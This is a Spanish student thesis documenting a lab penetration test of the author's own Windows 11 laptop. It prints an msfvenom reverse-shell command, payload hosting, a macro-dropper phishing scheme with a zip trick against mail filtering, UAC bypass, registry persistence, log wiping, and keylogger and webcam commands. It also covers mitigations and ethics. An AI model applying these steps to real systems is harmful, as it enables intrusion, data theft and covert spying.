# IntrusionYHardening

Índice 
 
Introducción .............................................................................................................. 3 
Motivación y justificación del proyecto........................................................................ 3 
Objetivos del TFG ................................................................................................... 3 
Alcance y limitaciones .............................................................................................. 3 
Metodología de trabajo ............................................................................................ 4 
Estado del Arte y Marco Teórico ..................................................................................... 5 
Conceptos fundamentales de Ciberseguridad .............................................................. 5 
Protocolos de red y seguridad en redes WI-FI .............................................................. 5 
Vulnerabilidades comunes en sistemas Windows.......................................................... 5 
Ingeniería social y entrega de payloads mediante Macros ............................................... 5 
Herramientas de auditoria utilizadas........................................................................... 6 
Diseño del Escenario de Laboratorio ................................................................................ 7 
Arquitectura de red del laboratorio ............................................................................ 7 
Configuración de la máquina atacante......................................................................... 7 
Configuración de la máquina victima .......................................................................... 8 
Creación del activo critico ......................................................................................... 9 
Fase de Reconocimiento y Análisis de Vulnerabilidades ...................................................... 10 
Escaneo de la red Wi-Fi y descubrimiento de hosts ..................................................... 10 
Fingerprinting: Identificación de servicios y sistema operativo con NMAP ....................... 10 
Análisis de la superficie de ataque del portátil objetivo ................................................ 11 
Escenario con Firewall Activo (Estado inicial) .......................................................... 11 
Escenario con firewall Desactivado (Análisis de Explotación) ..................................... 11 
Ejecución de Ataque y Explotación ................................................................................ 13 
Escenario A: Explotación Directa .............................................................................. 13 
Búsqueda de exploits en Metasploit ...................................................................... 13 
Configuración de payloads y lanzamiento............................................................... 13 
Escenario B Ingeniería Social y Malware tipo troyano ................................................... 14 
Generación de payload con MsfVenom .................................................................. 14 
2 
 
Creación de Word malicioso y programacion de la Macro VBA ................................... 14 
Ofuscación y Evasión de Defensas ....................................................................... 15 
Vector de infección y evasión de pasarelas ............................................................. 15 
Establecimiento de sesión con Meterpreter............................................................ 16 
Post-Explotación y Exfiltración. .................................................................................... 18 
Escalada de Privilegios: De usuario estándar a Administrador ....................................... 18 
Acceso al sistema de archivos y robo del archivo “clasificado.txt” ................................... 19 
Establecimiento de persistencia y Backdoors en el sistema ........................................... 21 
Borrados de Logs .................................................................................................. 22 
Análisis de Impacto y Medidas de Mitigación. .................................................................. 23 
Análisis de evidencias dejadas en el sistema ............................................................... 23 
Controles preventivos: Hardenng del SO y políticas de ejecución de macros. ................... 23 
Controles detectivos: Uso de Antivirus, EDR y monitorización de red.............................. 24 
Expansión de ataque y Conclusión ................................................................................. 25 
Expansión de Ataque ............................................................................................. 25 
Conclusión........................................................................................................... 26 
Aspecto Éticos y Legales ............................................................................................. 28 
Bibliografía y Anexos ................................................................................................. 29 
 
  
Introducción 
Motivación y justificación del proyecto 
Hoy en día los ataques de ciberseguridad están más presentes y las organizaciones se enfrentan 
a amenazas cada vez más sofisticadas. A pesar de las nuevas implementaciones para potenciar 
la seguridad, las inversiones en firewalls y sistemas de detección, el eslabón más débil y donde 
siempre se van a aprovechar es el ser humano y la confianza en las redes locales (LAN). 
La motivación a hacer este proyecto sale de la necesidad de como un atacante puede 
comprometer y robar información de un activo critico (un portátil corporativo/empresa) 
partiendo de cero. El interés nace en demostrar que, mediante unas técnicas combinadas de 
reconocimiento de red, explotación de vulnerabilidades e ingeniería social, es posible exfiltrar 
información sensible y tomar control total de un sistema, substrayendo la importancia de 
implementar seguridad multicapa. 
Objetivos del TFG 
• Objetivo General: 
Realizar una auditoría de seguridad integral mediante una simulación de ataque de ciclo 
completo sobre un equipo Windows en una red local, analizando desde la fase de 
reconocimiento hasta la exfiltración de datos y borrado de huellas (logs). 
Antes de comenzar hay que añadir que estos ataques son en un entorno controlado con 
dispositivos propios y datos que no me comprometen al mostrar dado que el archivo 
creado al cual sustraeré información esta creado con información falsa/ficticia. 
• Objetivos específicos: 
1. 
Mapear la red WI-FI y analizar la superficie de ataque mediante el uso de NMAP. 
2. Comprometer el sistema objetivo utilizando vectores de ingeniería social (macros de 
Office/Word). 
3. Obtener una sesión de control remoto (Meterpreter) y escalar privilegios hasta el nivel 
de Administrador/SYSTEM. 
4. Exfiltrar un activo critico (Clasificado.txt) . 
5. Establecer mecanismos de persistencia. 
6. Borrar registros de eventos para dificultar el análisis forense. 
Alcance y limitaciones 
• Alcance: 
o Entorno: Red local inalámbrica controlada bajo el segmento 192.168.1.0/24. 
o Activos: VM atacante (Kali Linux) y un equipo victima físico (Windows 11). 
o Técnicas: Escaneo de puertos, creación de payloads maliciosos, explotación vía 
macros VBA y post-explotación. 
3 
• Limitaciones: 
o La prueba se limita a la explotación de vulnerabilidades conocidas y fallos de 
configuración. 
o No se realizarán ataques que puedan comprometer la disponibilidad de ningún 
hardware físico o el funcionamiento de estos. 
o Las evasiones de antivirus o como no detectar un malware se comentará/tratará 
de manera teórica, priorizando la ejecución de la técnica sobre el desarrollo de 
malware complejo. 
Metodología de trabajo 
El proyecto sigue un estándar llamado PTES (Penetration Testing Execution Standard), 
estructurando las siguientes fases del ciclo: 
1. Interacción Previa: Definición de objetivos y configuración del laboratorio. 
2. Recolección de información: Uso de NMAP para descubrir el objetivo y sus servicios 
abiertos. 
3. Modelado de Amenazas: Identificación de la opción de entrada más viable (Macros en 
documento de Word). 
4. Explotación: Envío del payloads mediante ingeniería social y ejecución de la sesión 
inversa. 
5. Post-Explotación: Escalada de privilegios, robo del archivo objetivo y establecimiento de 
backdoors para mantener el acceso. 
6. Borrado de Huellas: Eliminación de logs y rastros de actividad en el sistema 
comprometido. 
4 
Estado del Arte y Marco Teórico 
Conceptos fundamentales de Ciberseguridad 
Estos son los pilares más importantes que este proyecto busca comprometer y luego proteger: 
Triada de la seguridad (CIA): Confidencialidad (el archivo de texto que solo el dueño ve), 
Integridad y Disponibilidad. 
Vulnerabilidad vs Exploits: La debilidad técnica frente al código que la aprovecha. 
Reverse Shell: Técnica donde la víctima se conecta al atacante para evadir firewalls de 
entrada. 
Protocolos de red y seguridad en redes WI-FI 
Modelo TCP/IP: Funcionamiento de puertos y servicios 
Seguridad inalámbrica: Pausa para mencionar los protocolos WPA2/WPA3 y el riesgo de 
los ataques “Man-in-the-Middle” o dispositivos no autorizados en la red local. 
Vulnerabilidades comunes en sistemas Windows 
Servicios Críticos: Explicación de servicios como SMB(puerto 445) o RDP(puerto 3389) 
que suelen ser vectores de ataque. 
UAC (User Account Control): El sistema de permisos de Windows que intentamos saltar 
en la fase de escalada de privilegios. 
Logs de Eventos: Como Windows registra las acciones es necesario borrarlos para que 
no sea fácil identificarnos y/o rastrearnos. 
Ingeniería social y entrega de payloads mediante Macros 
Phishing: Uso del engaño para que el usuario realice una acción. 
VBA (Visual Basic for Applications): Lenguaje de programación de Office que permite la 
automatización, pero que los atacantes usan para ejecutar comandos del sistema de 
forma oculta. 
5 
Herramientas de auditoria utilizadas 
• NMAP: Herramienta estándar para el descubrimiento de hosts y servicios. 
• Metasploit Framework: Plataforma para el desarrollo y ejecución de exploits. 
• Msfvenom: Componente de MSF para generar cargas útiles (payloads) personalizadas y 
ofuscadas. 
6 
Diseño del Escenario de Laboratorio 
Arquitectura de red del laboratorio 
Para esta auditoría, se ha prescindido de la virtualización en favor a un escenario con hardware 
real, lo que aporta un grado de realismo superior al enfrentarse a configuraciones de hardware 
y controladores auténticos. 
▪ Infraestructura de red: Ambos equipos se encuentran conectador a una red local 
inalámbrica privada (segmento 192.168.1.0/24) gestionada por un router independiente. 
▪ Aislamiento: La red de pruebas no tiene comunicación con redes externas. 
Configuración de la máquina atacante 
El sistema atacante es un ordenador físico con una distribución Kali Linux 2025.4 instalada de 
forma nativa.  
▪ Identificador de red(IP): 192.168.1.35. 
7 
▪ Herramientas preparadas: 
o Metasploit Framework: Para la gestión de sesiones. 
o Python3: Para el servidor HTTP temporal que alojara el payloads. 
o NMAP: Para el reconocimiento. 
Configuración de la máquina victima 
La máquina objetivo es un portátil comercial (ASUS) con Windows 11 actualizado. 
▪ Identificador de red (IP): 192.168.1.41 
▪ Software instalado: Microsoft Office 
▪ Estado de Seguridad: 
o Firewall: Activo (perfil red privada) 
o Antivirus: Para fines de la demostración técnica, se ha configurado una 
desactivación temporal de la protección en tiempo real permitiendo observar 
cómo se comporta y ejecuta la post-explotación. 
8 
Creación del activo critico 
El objetivo final de la intrusión es la exfiltración de información sensible. Para ello, se ha creado 
un archivo de texto ficticio que simula contener secretos corporativos. 
• Ruta del archivo: C:\Users\Macu\Desktop. 
• Contenidos: Texto simulado con datos financieros y contraseñas ficticias. 
• Propósito: Servir como “Flag” o cometido para que el ataque haya concluido y marcado 
como logrado teniendo en cuenta los requisitos de haber logrado acceso total al sistema 
de archivos y permisos de lectura sobre los documentos del usuario. 
9 
Fase de Reconocimiento y Análisis de 
Vulnerabilidades 
Escaneo de la red Wi-Fi y descubrimiento de hosts 
El primer paso de la auditoria consiste en identificar que dispositivos están conectados a la red 
local. Para ello, se realiza un barrido de tipo Ping Sweep sobre todo en el segmento de red. 
• Comando utilizado: nmap -sn 192.168.1.0/24 
• Objetivo: Localizar la dirección IP del portátil victima dentro del rango. 
Fingerprinting: Identificación de servicios y sistema operativo con NMAP 
Tras revisar el prefijo de cada dirección MAC he dado con la C8:FF:28 que identifica al fabricante 
Liteon technology. Dado el caso de que es uno de los principales distribuidores de tarjetas red 
OEM para ASUS, este dato es el primer indicador solido de que estamos ante el ordenador 
portátil objetivo. 
Una vez validada la presencia del activo en la red local, se procede a realizar un escaneo exhausto 
sobre la dirección IP 192.168.1.41. El objetivo es determinar con precisión los servicios en 
ejecución, sus versiones y la arquitectura del sistema operativo. 
• Comando utilizado: nmap -sV -sC -O -Pn 192.168.1.41 
• Análisis de parámetros críticos:  
o -sV: Permite la detección de versiones, fundamental para identificar si los servicios 
expuestos tienen vulnerabilidades conocidas (CVE) o desactualizadas. 
o -sC: Ejecuta la librería de scripts predeterminada de nmap permitiendo una 
enumeración más agresiva de servicios como SMB o protocolos de resolución de 
nombres. 
10 
o -O: Habilita la detección de sistema operativo mediante el análisis de TCP/IP, 
permitiendo confirmar que el objetivo es una estación de trabajo Windows. 
o -Pn: Parámetro indispensable en auditorias sobre sistemas Windows modernos 
ya que asume que el usuario esta activo y omite el descubrimiento por ICMP (ping), 
el cual suele estar bloqueado por el firewall del sistema por defecto. 
Análisis de la superficie de ataque del portátil objetivo 
En esta fase se realizó un análisis comparativo para determinar el impacto de las medidas de 
seguridad del host en la visibilidad de la red. 
Escenario con Firewall Activo (Estado inicial) 
Inicialmente, se lanzó el escaneo nmap -sV -sC -O -Pn sobre el objetivo 192.168.1.41 con 
las protecciones del sistema activas. El resultado mostro un blindaje perimetral casi total: 
• Resultados: 1000 puertos filtrados (no-response) 
• Limitación: El firewall descarto los paquetes de sondeo, impidiendo identificar 
el Sistema Operativo o los servicios en ejecución. 
• Impacto: Nmap tardo 72.93 segundos en completar el análisis debido a la 
espera de respuestas que no llegaron (timeouts) 
Escenario con firewall Desactivado (Análisis de Explotación) 
Para fines de auditoría interna, se procedió a desactivar temporalmente el firewall de la 
víctima. Al repetir exactamente el mismo comando, la cantidad de información revelada 
aumento exponencialmente, dejando al descubierto la verdadera identidad del equipo: 
• Puertos críticos: Se detectaron los puertos 135(MSRPC), 139(NetBIOS) y 
445(SMB). 
• Identificador del Sistema: Se confirmo el uso de Windows 11 y se obtuvo el 
nombre de red del equipo: DESKTOP-01O917C. 
• Eficiencia: El tiempo de escaneo se redujo drásticamente a solo 17.13 
segundos. 
11 
12 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Ejecución de Ataque y Explotación 
Escenario A: Explotación Directa 
En esta fase se evaluó la posibilidad de comprometer el sistema mediante el aprovechamiento 
de vulnerabilidades en los servicios expuestos. 
Búsqueda de exploits en Metasploit 
Tras identificar que el puerto 445(SMB) está abierto (con el firewall desactivado) se 
procedió a buscar exploits conocidos para versiones de Windows 10/11 utilizo la base de 
datos de Exploit-DB y el comando search de Metasploit. 
• Resultado: Aunque existen exploits como EternaBlue, los sistemas modernos y 
actualizados cuentan con parches de seguridad que los invalidan. No se hallaron 
vulnerabilidades de ejecución remota de código (RCE) que no requieran 
interacción del usuario 
Configuración de payloads y lanzamiento 
Se intentaron módulos de escaneo auxiliares (auxiliary/scanner/smb/smb_ms17_010), 
confirmando que el host no era vulnerable. Por tanto, se descarta la explotación directa 
debido a la actualización del sistema operativo y la supuesta (se desactivo para probar la 
explotación) presencia del firewall en condiciones normales.  
13 
Escenario B Ingeniería Social y Malware tipo troyano 
Se opta por un ataque de Lado del cliente (Client-side-Attack) utilizando un documento 
ofimático como vector de infección. 
Generación de payload con MsfVenom 
Se genero un ejecutable malicioso (factura.exe) configurado para realizar una conexión 
reversa hacia la IP del atacante por el puerto 8080, un puerto comúnmente asociado a 
tráfico web alternativo para evitar sospechas. 
• Comando: 
msfvenom -p 
windows/x64/meterpreter/reverse_tcp 
LHOST=192.168.1.162 LPORT=8080 -f exe -o factura.exe 
Creación de Word malicioso y programacion de la Macro VBA 
Se diseño un documento .docm que incluye una macro automatizada. Para evadir 
detección inicial, la macro no contiene el código malicioso en sí, sino una instrucción de 
PowerShell que descarga el payload desde un servidor controlado por el atacante. 
14 
• Servidor de descarga: Se habilito un servidor web temporal en Kali mediante 
python3 -m http.server 80. 
Ofuscación y Evasión de Defensas 
Durante la fase de entrega del payload, se constató que las firmas genéricas de msfvenom eran 
identificadas por el motor del antivirus (Windows Defender). En una intrusión real, un atacante 
emplearía técnicas de evasión avanzada (como el uso de Polymorphic Encoders, Custom Packers 
o Shellcode Injection en memoria) para lograr un estado FUD (Fully Undetectable). 
Vector de infección y evasión de pasarelas 
Para garantizar que el documento malicioso llegara a la bandeja de entrada del objetivo, se utilizó 
un vector de Spear Phishing. Conscientes de que los servicios de correo electrónico como Gmail 
15 
integran potentes motores de análisis estático que bloquean macros sospechosas o binarios, se 
empleó una técnica de empaquetado protegido: 
• Compresión con cifrado: El documento .docm se comprimió en un .zip protegido 
con una contraseña simple (ej. “1234”). 
• Justificación técnica: Esta técnica impide que los gateways de seguridad de correo 
realicen una inspección profunda de paquetes (DPI) o un análisis del código VBA 
de la macro, ya que el contenido viajara cifrado. 
• Ingeniería social: En el cuerpo del correo, se indicó al usuario que, por "políticas 
de seguridad y privacidad de datos", el documento adjunto estaba cifrado, 
proporcionándole la clave en el mismo mensaje. Esto no solo evade la detección 
técnica, sino que añade un falso sentido de seguridad y confidencialidad que 
aumenta la confianza de la víctima. (esto no se utilizó en si ya que eran correos que 
yo conocía, pero si el atacante quiere ganarse la confianza desde un correo externo 
a él debería implementar esto). 
Establecimiento de sesión con Meterpreter 
Tras la ejecución de la macro, el sistema victima inicio una conexión reversa. El Hendler de 
Metasploit recibió la conexión exitosamente, proporcionando una interfaz Meterpreter. Esta 
interfaz permite la ejecución de comandos avanzados en memoria, evitando en gran medida la 
escritura en disco y la detección de firmas. 
16 
• Comando de verificación: sysinfo y getuid. 
Para garantizarla persistencia y ocultación, se listaron procesos activos con el comando ps y se 
migro la sesión desde el proceso original hacia explorer.exe. 
• Comando: migrate [PID]. 
• Justificación: Esto permite que, aunque el usuario cierre el documento Word o el proceso 
original, el atacante mantenga el acceso mientras la sesión de usuario este activa. 
17 
Post-Explotación y Exfiltración. 
Una vez establecida la comunicación entre el equipo victima (ASUS) y la estación de control (Kali), 
se procedió a realizar tareas post-explotación para evaluar el alcance del compromiso. 
Escalada de Privilegios: De usuario estándar a Administrador 
El acceso inicial se obtuvo con los privilegios del usuario macu. Para realizar cambios profundos 
en el sistema o acceder a áreas restringidas, es necesario obtener privilegios de SYSTEM. 
1. Verificación de privilegios: Se utilizo el comando getprivs. 
2. Técnica de escalada: Se empleo el comando getsystem de Meterpreter. Este comando 
intenta automatizar la elevación de privilegios mediante diversas técnicas de 
impersonación (suplantación de identidad). 
3. Técnica de escalada/2: Para obtener privilegios de otra forma y superar las restricciones 
de Control de Cuentas de Usuario (UAC) de Windows sin alertar a la víctima, se 
complementó la acción mediante el uso de módulos de post-explotación (como 
exploit/windows/local/bypassuac_dotnet o similares). Estos módulos aprovechan 
debilidades en la implementación de UAC para inyectar el payload en un proceso de 
confianza y obtener un token de integridad alta. 
4. Resultado: Tras la ejecución del comando getuid se confirma el ascenso de privilegios al 
nivel máximo del sistema. 
18 
Acceso al sistema de archivos y robo del archivo “clasificado.txt” 
Con los privilegios elevados, el atacante tiene acceso total a cualquier carpeta del equipo, 
incluyendo las de otros usuarios o archivos protegidos. 
1. Navegación: Se exploro el directorio mediante ls hasta localizar la información sensible. 
19 
2. Exfiltración: Se utilizo el comando download para transferir el archivo del equipo victima 
a la máquina atacante. 
a. Comando: download "Clasificado.txt" /root/Escritorio/ 
Este supuesto documento tiene información sensible y que no nos gustaría que otra persona 
poseyera por eso es importante guardar los documentos esenciales bajo seguridad o en un lugar 
donde sea “Impenetrable”. 
20 
Establecimiento de persistencia y Backdoors en el sistema 
Para evitar la pérdida en caso de reinicio del equipo o cierre de la sesión actual, se configuro un 
mecanismo de persistencia. 
• Acción de Verificación: Se accedió físicamente al equipo víctima y se ejecutó la 
herramienta de administración regedit.exe con privilegios elevados. 
• Técnica Utilizada: Se empleó el módulo exploit/windows/persistence/registry 
configurado para un payload x64. A diferencia de los métodos de usuario simple, este 
módulo se configuró con la opción STARTUP SYSTEM, lo que permitió escribir en la 
colmena HKEY_LOCAL_MACHINE (HKLM). 
• Ruta de Registro: Se navegó hasta la clave de máquina local: 
HKLM\Software\Microsoft\Windows\CurrentVersion\Run. 
• Identificación del Artefacto: Se identificó un valor de cadena con el nombre aleatorio 
oN8F1z6V. Este registro apunta directamente al binario malicioso (payload x64) alojado 
en el sistema de archivos. 
• Efecto: Al estar ubicado en la rama de máquina local (HKLM), el backdoor se ejecuta con 
privilegios de SYSTEM antes incluso de que el usuario macu inicie sesión. Esto garantiza 
que el equipo comprometido envíe una conexión reversa a la IP del atacante 
(192.168.1.162) en cada ciclo de arranque del hardware. 
21 
Borrados de Logs 
Tras cumplir los objetivos de intrusión (exfiltración de clasificado.txt y establecimiento de 
persistencia), la fase final consiste en eliminar los rastros de actividad en el sistema 
comprometido para evitar la detección forense. 
Desde la sesión de Meterpreter, se ejecutó un comando de limpieza automática de los registros 
de eventos de Windows. 
• Comando: clearev. 
• Acción: Este comando borra los tres registros principales de Windows: Application, 
System and Security. 
• Resultado: Al ejecutarlo, se eliminan las entradas que registran el inicio de servicios 
sospechosos, errores de autenticación o la ejecución de comandos anómalos. 
Como se observó en la fase de persistencia, Metasploit genera un archivo de limpieza (.rc) en la 
máquina atacante. 
22 
Análisis de Impacto y Medidas de 
Mitigación. 
Análisis de evidencias dejadas en el sistema 
En esta sección se detallan los rastros técnicos que permitirían a un analista forense identificar 
el compromiso del equipo ASUS. 
• Persistencia en el Registro: El uso del comando regedit.exe permitió localizar la clave 
maliciosa oN8F1z6V en la ruta HKLM\Software\Microsoft\Windows\CurrentVersion\Run. 
Esta es la evidencia física de que el atacante garantizó su acceso tras cada reinicio. 
• Manipulación de Logs: Se analizó el Visor de Eventos de Windows (logs de Seguridad, 
Sistema y Aplicación) tras la intrusión. La ausencia de registros confirma la ejecución de 
técnicas antiforense para ocultar la actividad del payload x64. 
Controles preventivos: Hardenng del SO y políticas de ejecución de 
macros. 
Este apartado se centra en las barreras que habrían evitado que el ataque tuviera éxito desde el 
inicio. 
• Hardening del Firewall: Como se ha demostrado, el firewall es la primera y más crítica 
línea de defensa. Mantenerlo activo la fase de reconocimiento, impidiendo que el sistema 
“regale” información sobre su arquitectura x64 y servicios vulnerables. 
• Cierre de Puertos Críticos: Se implementaron reglas de bloqueo para los puertos 135 
(MSRPC), 139(NetBIOS) y 445 (SMB). Esta medida no hace el ordenador inutilizable; el 
usuario puede seguir navegando y trabajando con normalidad, pero se elimina la 
superficie de ataque principal. 
23 
• Políticas de Macros: Se recomienda la desactivación total de macros VBA mediante 
directivas de grupo (GPO), impidiendo que el documento de Word original ejecutara el 
código malicioso. 
Controles detectivos: Uso de Antivirus, EDR y monitorización de red. 
Incluso si la prevención falla, los controles detectivos deben identificar la anomalía. 
1. Detección de Payloads: Un Antivirus actualizado habría identificado la firma del 
ejecutable generado por Metasploit. 
2. Análisis de Comportamiento(EDR): Un sistema EDR habría detectado 
comportamientos sospechosos, como un proceso de Word intentando realizar una 
conexión reversa por el puerto 8080 o escribiendo en ramas críticas del registro como 
HKLM. 
3. Monitorización de Red: El uso de herramientas de monitoreo habría revelado la 
exfiltración de datos hacia una dirección IP externa no autorizada. 
24 
Expansión de ataque y Conclusión  
Expansión de Ataque 
Antes de interactuar con el dispositivo final, el ataque puede comenzar con la vulneración de la 
infraestructura de red del objetivo. 
• Auditoría y Escaneo de Redes: Utilizando herramientas como airmon-ng en una tarjeta 
de red en modo monitor, es posible identificar redes Wi-Fi cercanas. Esto permite 
detectar SSID de la víctima sin haber interactuado con su equipo físico. 
• Captura de Handshake y Cracking: Se procede a realizar un ataque de desautenticacion 
para forzar a un cliente legitimo a reconectarse, capturando así el Handshake 
(WPA/WPA2). Mediante el uso de diccionario o fuerza bruta, se logra el cracking de la 
contraseña Wi-Fi, permitiendo al atacante situarse dentro de la red Local (LAN) de la 
víctima. 
Una vez el atacante a ganado acceso a la red, el equipo ASUS queda expuesto a un análisis 
profundo. 
• Ingeniería Social Dirigida (Phishing): Con el conocimiento de que la víctima está en la 
red, se utiliza un correo común o de un remitente conocido para enviar el documento 
Word malicioso. Al estar en el mismo entorno, el engaño es más creíble, facilitando que el 
usuario ejecute el payload que desplegará la sesión de Meterpreter. 
Gracias a la arquitectura del payload x64, una vez establecida la sesión con privilegios de 
SYSTEM, es posible realizar un streaming constante y silencioso del dispositivo afectado, 
comprometiendo totalmente la privacidad física y digital de la víctima. 
Captura de Pantalla (ScreenShare): Se obtiene visibilidad total y en tiempo real de las 
actividades del usuario. Esto permite al atacante leer documentos abiertos, monitorizar 
comunicaciones privadas y observar hábitos de navegación sin que la víctima perciba 
ninguna ralentización en su equipo. 
25 
Registro de teclado (Keylogging): Mediante el uso de los comandos keyscan_start y 
keyscan_dump, se capturan todas las pulsaciones del teclado de forma local. Esta técnica 
es crítica, ya que permite el robo de contraseñas bancarias, credenciales de redes sociales 
y el contenido de correos electrónicos antes de que sean cifrados por los protocolos de 
red. 
Acceso a la Camara Web (Webcam Streaming): A través del comando webcam_stream, 
el atacante puede activar la cámara integrada del dispositivo para observar el entorno 
físico de la víctima. Este módulo representa la violación de privacidad más grave, 
permitiendo el espionaje visual sin activar indicadores luminosos en muchos modelos, lo 
que facilita la extorsión o el reconocimiento del entorno de trabajo. 
Conclusión 
Tras completar el ciclo de ataque, este apartado analiza el impacto de la intrusión y las medidas 
necesarias para neutralizarla, demostrando que el éxito del espionaje depende de la explotación 
26 
de servicios vulnerables y la falta de filtrado en red. Se ha comprobado que el firewall es la 
primera y más crítica línea de defensa de cualquier host, ya que un sistema sin una configuración 
de filtrado estricta regala al atacante una ventaja táctica insuperable. Sin esta barrera, el intruso 
puede identificar con precisión servicios activos y puertos abiertos. 
Uno de los hallazgos más relevantes de este proyecto es desmentir que el Hardening 
compromete la experiencia del usuario. El cierre de los puertos 135, 139 y 445 mediante reglas 
de entrada se revela como una medida esencial que no hace el ordenador casi inutilizable; por el 
contrario, el usuario mantiene su capacidad de navegación y trabajo diario intacta mientras se 
elimina el vector de reconocimiento utilizado por protocolos obsoletos para mapear el sistema 
desde la red Wi-Fi. 
La fase de expansión ha puesto de manifiesto que el objetivo actual del cibercrimen es la 
exfiltración de la vida privada. El uso de módulos de cámara y capturas de pantalla convierte el 
equipo en una herramienta de espionaje constante, representando una de las violaciones de 
privacidad más graves al observar el entorno físico del usuario sin alertas visuales. Asimismo, el 
registro de pulsaciones de teclado anula cualquier política de contraseñas robustas al capturar 
la información antes de ser cifrada, dejando la seguridad de cuentas bancarias y correos a 
merced del atacante. 
La creación de la clave de registro maliciosa oN8F1z6V ejemplifica la peligrosidad de la 
persistencia silenciosa, la cual puede durar meses si no se implementan controles detectivos 
periódicos como las auditorías de registro. Finalmente, el proyecto subraya que la tecnología 
más avanzada es vulnerable si el eslabón humano falla. El uso de remitentes conocidos para 
distribuir malware anula las defensas técnicas más sofisticadas, concluyendo que, aunque el 
Hardening y el firewall son pilares esenciales, la educación digital para identificar adjuntos 
sospechosos es la única defensa capaz de detener la amenaza antes de que este alcance el disco 
duro. 
27 
Aspecto Éticos y Legales 
La realización de una auditoria de seguridad, incluso en un entorno académico, conlleva una 
responsabilidad ética y legal inimaginable. El presente proyecto se ha desarrollado bajo los 
principios del “Hacking ético”, garantizando que todas las técnicas de intrusión y exfiltración de 
datos se ejecutaran exclusivamente en un entorno de laboratorio/real controlado. Se conto en 
todo momento con la autorización explicita para auditar el equipo ASUS, cumpliendo así con el 
requisito fundamental de consentimiento previo que diferencia una investigación legítima de 
una actividad delictiva. El objetivo primordial no ha sido la obtención ilícita de información, sino 
la identificación de vulnerabilidades para proponer medidas de mitigación que protejan al 
usuario final. 
Desde la perspectiva legal en España, este trabajo se alinea con el respeto a la normativa 
vigente. El Código Penal, en sus artículos 197 y 264, menciona delitos como el descubrimiento 
y revelación de secretos, así como los daños informáticos y la interrupción de servicios. El 
acceso no autorizado a sistemas mediante el despliegue de payloads o la interceptación de 
comunicaciones sin permiso son conductas penadas por la ley. Al documentar estas 
vulnerabilidades, este TFG subraya la importancia del cumplimiento normativo y advierte sobre 
las consecuencias legales de replicar estas técnicas fuera de un marco profesional o educativo 
autorizado. La ética en la ciberseguridad es el pilar que permite que la investigación técnica 
sirva como herramienta de progreso y protección social. 
Para tener en cuenta que al finalizar las pruebas se procedió la limpieza total de los archivos 
maliciosos (como la clave oN8F1z6V) y hardenizacion del equipo y la puesta en marcha de todo 
ajuste de seguridad (Firewall, Microsoft Defender Antivirus y aislamiento de núcleo) para 
devolver el sistema a su estado original seguro. 
28 
Bibliografía y Anexos 
I. 
II. 
III. 
IV. 
Marcos de Referencia y Estándares Internacionales 
a. MITRE ATT&CK Framework 
https://attack.mitre.org/ 
b. Penetration Testing Execution Standard (PTES) 
https://www.euskadi.eus/gobierno-vasco/-/ciberpedia/marcos-de
referencia/penetration-testing-execution-standard-ptes/ 
Documentación de Herramientas de Auditoría 
a. Metasploit Framework Documentation 
https://docs.metasploit.com/ 
b. Nmap Network Scanning 
https://www.freecodecamp.org/espanol/news/que-es-nmap-y-como-usarlo-un
tutorial-para-la-mejor-herramienta-de-escaneo-de-todos-los-tiempos/ 
Conceptos de Seguridad y Hardening (Defensa) 
a. User Account Control (UAC) 
https://learn.microsoft.com/es-es/windows/security/application
security/application-control/user-account-control/how-it-works 
b. Guía de Hardening de Sistemas Operativos (INCIBE/Microsoft) 
https://www.incibe.es/incibe-cert/blog/configuracion-de-seguridad-de-un
endpoint-windows 
https://www.incibe.es/ciudadania/tematicas/configuraciones-dispositivos 
c. Escalada de Privilegios 
https://www.proofpoint.com/es/threat-reference/privilege-escalation 
d. Funcionamiento de Logs 
https://www.godaddy.com/resources/latam/tecnologia/log-que-es 
e. Puerto TCP/UDP 
https://vermiip.es/puertos.php 
f. 
Barrido de Ping (Ping Sweep) 
https://www.vpnunlimited.com/es/help/cybersecurity/ping
sweep?srsltid=AfmBOooh2fEH6Zmd3SkrVxQDUrtp8GFSvC1dVsjHIg47yiY0YoIljt
Tj 
Desarrollo de Malware y Técnicas de Evasión 
a. Shell Code Injection 
https://medium.com/@foktavian/malware-under-the-hood-a-deep-dive-into
shellcode-injection-techniques-d38116b4cb28 
b. Custom Malware Package 
https://www.huntress.com/cybersecurity-101/topic/malware-packer 
29 
https://medium.com/@d.bougioukas/red-team-diary-entry-3-custom-malware
development-establish-a-shell-through-the-browser-bed97c6398a5 
https://codehunter.com/news-and-blog/from-commodity-to-specialized-the
rise-of-custom-malware-in-2025 
c. Polymorphic Code 
https://en.wikipedia.org/wiki/Polymorphic_code 
d. Fully UnDetectable (FUD) 
https://www.neushield.com/learn/fully-undetectable-fud/ 
V. Marco Legal y Normativo 
a. Artículo 197 del Código Penal 
https://www.conceptosjuridicos.com/codigo-penal-articulo-197/ 
b. Artículo 264 del Código Penal 
https://www.conceptosjuridicos.com/codigo-penal-articulo
264/#:~:text=El%20que%20por%20cualquier%20medio,seis%20meses%20a%2
0tres%20a%C3%B1os 
VI. 
Recursos Multimedia y Apoyo Técnico 
a. Hacking WI-FI 
https://www.youtube.com/watch?v=nsmSZPLhGGU 
